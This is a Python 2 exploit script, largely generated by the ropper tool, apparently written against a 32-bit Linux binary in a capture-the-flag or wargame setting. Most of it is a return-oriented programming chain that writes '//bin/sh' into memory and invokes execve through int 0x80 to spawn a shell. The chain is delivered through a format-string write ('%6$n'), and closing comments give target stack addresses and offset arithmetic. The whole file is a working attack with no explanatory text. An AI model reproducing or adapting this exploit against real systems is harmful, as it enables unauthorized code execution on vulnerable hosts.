#!/usr/bin/env python
# Generated by ropper ropchain generator #
from struct import pack

p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # c7afa78cd1450bfb89f67597db21844fb27a5a9640379851643aff542012af72
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += p(0x08056694) # 0x08056694: pop eax; pop edx; pop ebx; ret;
rop += rebase_0(0x000a9060)
rop += '//bi'
rop += p(0xdeadbeef)
rop += rebase_0(0x00033eea) # 0x0807beea: mov dword ptr [eax], edx; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0x08056694) # 0x08056694: pop eax; pop edx; pop ebx; ret;
rop += rebase_0(0x000a9064)
rop += 'n/sh'
rop += p(0xdeadbeef)
rop += rebase_0(0x00033eea) # 0x0807beea: mov dword ptr [eax], edx; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x0000e0f0) # 0x080560f0: xor eax, eax; ret; 
rop += rebase_0(0x00026a7b) # 0x0806ea7b: pop edx; ret; 
rop += rebase_0(0x000a8068)
rop += rebase_0(0x0000eb35) # 0x08056b35: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00026aa2) # 0x0806eaa2: pop ecx; pop ebx; ret; 
rop += rebase_0(0x000a8068)
rop += p(0xdeadbeef)
rop += rebase_0(0x000001d1) # 0x080481d1: pop ebx; ret; 
rop += rebase_0(0x000a8060)
rop += rebase_0(0x00026a7b) # 0x0806ea7b: pop edx; ret; 
rop += rebase_0(0x000a8068)
rop += rebase_0(0x0000e0f0) # 0x080560f0: xor eax, eax; ret; 
rop += rebase_0(0x0001678c) # 0x0805e78c: inc eax; pop edi; ret; 
rop += p(0xdeadbeef)
rop += rebase_0(0x0001678c) # 0x0805e78c: inc eax; pop edi; ret; 
rop += p(0xdeadbeef)
rop += rebase_0(0x0001678c) # 0x0805e78c: inc eax; pop edi; ret; 
rop += p(0xdeadbeef)
rop += rebase_0(0x0001678c) # 0x0805e78c: inc eax; pop edi; ret; 
rop += p(0xdeadbeef)
rop += rebase_0(0x0001678c) # 0x0805e78c: inc eax; pop edi; ret; 
rop += p(0xdeadbeef)
rop += rebase_0(0x0001678c) # 0x0805e78c: inc eax; pop edi; ret; 
rop += p(0xdeadbeef)
rop += rebase_0(0x0001678c) # 0x0805e78c: inc eax; pop edi; ret; 
rop += p(0xdeadbeef)
rop += rebase_0(0x0001678c) # 0x0805e78c: inc eax; pop edi; ret; 
rop += p(0xdeadbeef)
rop += rebase_0(0x0001678c) # 0x0805e78c: inc eax; pop edi; ret; 
rop += p(0xdeadbeef)
rop += rebase_0(0x0001678c) # 0x0805e78c: inc eax; pop edi; ret; 
rop += p(0xdeadbeef)
rop += rebase_0(0x0001678c) # 0x0805e78c: inc eax; pop edi; ret; 
rop += p(0xdeadbeef)
rop += rebase_0(0x000273b0) # 0x0806f3b0: int 0x80; ret;

ret_addr = "dccdffff"

print ret_addr.decode('hex') + rop + "%3166109491c%6$n"


# online addr 0xffffb6bc
# exe, 5 addr 0xffffa78c

# retaddr on exe = 0xffffcddc

# 3166109699 - 204 - 4 = 3166109491
